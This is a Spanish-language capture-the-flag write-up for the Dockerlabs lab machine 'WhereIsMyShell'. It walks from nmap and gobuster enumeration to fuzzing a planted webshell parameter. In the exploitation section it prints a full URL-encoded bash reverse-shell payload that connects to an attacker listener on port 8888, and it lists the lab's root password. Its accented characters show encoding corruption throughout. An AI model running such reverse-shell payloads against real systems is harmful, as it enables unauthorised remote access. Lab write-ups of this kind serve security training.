# Write-up: 

- **Nombre de la m치quina:** `WhereIsMyShell` 
- **Plataforma:** `Dockerlabs` 
- **IP:** `172.17.0.2` 
- **SO:** `Linux` 
- **Dificultad:** `F치cil`

---

## 1. RECONOCIMIENTO

El objetivo de esta fase es identificar los puntos de entrada y servicios expuestos en la m치quina v칤ctima.

#### 1.1. Verificaci칩n de Conectividad

Se lanza un `ping` para confirmar que la m치quina est치 activa y obtener el TTL lo que puede darnos una primera pista sobre el sistema operativo.
```	
ping 172.17.0.2
```

Nos devuelve conectividad y un TTL=64 por lo que estamos ante una m치quina Linux.

<p align="center">
    <img src="Imagenes/222.png" width="1000">
</p>

#### 1.2. Escaneo de Puertos

Se realiza un escaneo con **Nmap** para descubrir puertos abiertos, los servicios que corren en ellos y sus versiones.

```
sudo nmap -p- -sV -sC -sS --min-rate 5000 --open -n -Pn 172.17.0.2 -oN port_scan.txt
```

**Puertos Descubiertos:**

| Puerto | Servicio | Versi칩n       | Notas                                |
| ------ | -------- | ------------- | ------------------------------------ |
| 80     | http     | Apache 2.4.57 | Iniciaremos por aqu칤. No hay otro XD |

<p align="center">
    <img src="Imagenes/223.png" width="1000">
</p>

Normalmente el acceso por el puerto 22 al servicio ssh requiere de credenciales. Ya sea usuario y contrase침a o clave rsa. En este caso carecemos de informaci칩n al respecto as칤 que lo m치s productivo es explorar el puerto :80

---

## 2. ENUMERACI칍N

Una vez identificados los servicios, se procede a investigarlos en profundidad en busca de vulnerabilidades o informaci칩n 칰til.

### Puerto 80 ( HTTP)

#### Enumeraci칩n Manual:

- **Navegaci칩n web:** Se visita el sitio en `http://172.17.0.2.
    Vemos una frase : "==Pista==: "Guardo un secretito en /temp;)"
<p align="center">
    <img src="Imagenes/224.png" width="1000">
</p>

- **An치lisis del c칩digo fuente:** Se revisa el HTML en busca de comentarios, rutas o scripts ocultos.
    No encontramos nada relevante
	
<p align="center">
    <img src="Imagenes/225.png" width="1000">
</p>

- **Archivos comunes:** Se buscan manualmente archivos y directorios comunes:
	- `/robots.txt`-->X
	- `/sitemap.xml`--> X
	- `/login`--> X
	- `/admin`--> X
	- `/panel`--> X
	- `/user`--> X
	- `/panel`--> X
	- `/backup`--> X
	- `/uploads`--> X
	- `test, etc.`--> X
    
    No encontramos nada
#### Enumeraci칩n Autom치tica:
- Lanzamos la herramienta `whatweb` para que nos de informaci칩n sobre la aplicaci칩n web. 
```
whatweb 172.17.0.2
```

<p align="center">
    <img src="Imagenes/226.png" width="1000">
</p>

Nada relevante. 


- Lanzamos la herramienta de enumeraci칩n `gobuster` para buscar directorios ocultos y extensiones .php,.txt y .html 

```
gobuster dir -u http://172.17.0.2/ -w /urs/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,html -k
```

<p align="center">
    <img src="Imagenes/236.png" width="1000">
</p>

**Hallazgos:**
Vemos  rutas llamativas:
- 172.17.0.2/shell.php: 
  Podemos ver una p치gina en blanco...
	
- 172.17.0.2/warning.html:
	Podemos leer: `Esta web ha sido atacada por otro hacker, pero su webshell tiene un par치metro que no recuerdo... `
<p align="center">
    <img src="Imagenes/227.png" width="1000">
</p>

Teniendo como pista que existe un par치metro que no recuerda haremos fuzzing a `shell.php` y encontramos el par치metro :

<p align="center">
    <img src="Imagenes/228.png" width="1000">
</p>


Con el que hemos podido ejecutar la consola en `shell.php`
<p align="center">
    <img src="Imagenes/229.png" width="1000">
</p>

Si hemos podido ejecutar comandos en una consola, utilizaremos esta brecha para ejecutar una `revershell`



---

## 3. EXPLOTACI칍N

### 3.1 Acceso inicial:

Ejecutaremos la revershell en dos pasos sencillos:
1. Levantaremos un puerto de escucha, en nuestro caso el 8888
```
   sudo nc -nvlp 8888
```
   
3. Generaremos un c칩digo en https://www.revshells.com/ que abusando de la vulnerabilidad que hemos encontrado`RCE- Ejecuci칩n remota de comandos`  nos ejecutara la revershell y tendremos acceso desde nuestra terminal. 
   
```
 http://172.17.0.2/shell.php?parameter=bash%20-c%20%22/bin/bash%20-i%20%3E%26%20/dev/tcp/10.0.0.5/8888%200%3E%261%22
```

<p align="center">
    <img src="Imagenes/230.png" width="1000">
</p>


---

## 4. ESCALADA DE PRIVILEGIOS

Una vez dentro, el objetivo es elevar los privilegios del usuario actual al de `root`.

### 4.1. Enumeraci칩n Interna

Se realizan comprobaciones b치sicas y se buscan posibles vectores de escalada.

#### Comprobaciones del sistema:

쮸 qu칠 grupo pertenezco?
```
id
```
<p align="center">
    <img src="Imagenes/231.png" width="1000">
</p>

쯈u칠 usuario hay en el sistema?
쯈u칠 usuario tienen una shell asignada?

```
cat /etc/passwd | grep sh
```


<p align="center">
    <img src="Imagenes/232.png" width="1000">
</p>



#### B칰squeda del Vector de Escalada:

Si recordamos en la pista encontrada anteriormente nos dec칤an que escond칤an un secreto en `/tmp`. Lo revisamos:
`/tmp`:

<p align="center">
    <img src="Imagenes/233.png" width="1000">
</p>

Encontramos el archivos `.secret.txt` donde encontramos la contrase침a de `root`
<p align="center">
    <img src="Imagenes/234.png" width="1000">
</p>

**Credenciales obtenidas:**
- **Usuario:** `root`
- **Contrase침a:** `contrase침aderoot123`

### 4.2. Explotaci칩n y Escalada a Root

Probamos las credenciales encontradas y BINGO游 


<p>
    <img src="Imagenes/235.png" width="50%" height="auto">
</p>



SOMOS ROOT游


